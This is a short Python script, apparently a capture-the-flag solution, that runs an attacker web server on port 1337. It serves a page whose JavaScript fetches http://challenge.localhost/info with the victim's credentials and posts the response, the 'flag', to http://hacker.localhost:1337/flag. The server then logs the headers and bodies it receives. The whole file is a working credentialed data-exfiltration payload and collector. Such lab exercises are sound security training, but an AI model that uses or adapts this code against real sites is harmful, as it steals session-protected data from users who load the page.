from http.server import SimpleHTTPRequestHandler, HTTPServer
class WebHandler(SimpleHTTPRequestHandler):
    def handle_request(self):
        # Print client headers
        print('\n' + str(self.headers).strip() + '\n')
        # Print client data
        contentLength = int(self.headers.get("Content-Length", 0))
        if contentLength:
            print(self.rfile.read(contentLength))
            print()
        self.send_response(200)
        self.end_headers()
    def do_OPTIONS(self):
        self.send_response(200)
    def do_GET (self):
        self.handle_request()
        response = """<html>
    <script>
        let xhr = new XMLHttpRequest();
        xhr.open("GET", `http://challenge.localhost:80/info`, false);
        xhr.withCredentials = true;
        xhr.send();
        let flag = xhr.responseText;
        xhr = new XMLHttpRequest();
        xhr.open("POST", `http://hacker.localhost:1337/flag`, false);
        xhr.send(flag);
    </script>
</html>
"""
        self.wfile.write(bytes(response, "utf-8"))

    def do_POST(self):
        self.handle_request()
        response = ""
        self.wfile.write(bytes(response, "utf-8"))

server_address = ("127.0.0.1", 1337)
server = HTTPServer(server_address, WebHandler)
server.serve_forever()

